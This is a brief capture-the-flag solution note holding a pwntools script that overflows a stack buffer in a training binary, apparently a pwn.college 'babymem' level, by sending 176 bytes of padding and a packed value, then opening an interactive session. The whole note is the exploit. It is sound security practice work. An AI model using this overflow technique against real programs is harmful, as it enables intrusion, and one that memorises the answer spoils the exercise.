# Pwn Beby mem

## 1
```py
  1 from pwn import *                       
  2                                         
  3 padding = b'A' * 176                    
  4 payload = padding + p64(0x2dbba028)     
  5                                         
  6 p = process('/challenge/babymem_level1.0')         
  7 p.recvuntil('size:')                    
  8 p.sendline('120')                       
  9                                         
 10 p.recvuntil('bytes)!')                  
 11 p.send(payload)                         
 12 p.interactive() 
 ```
 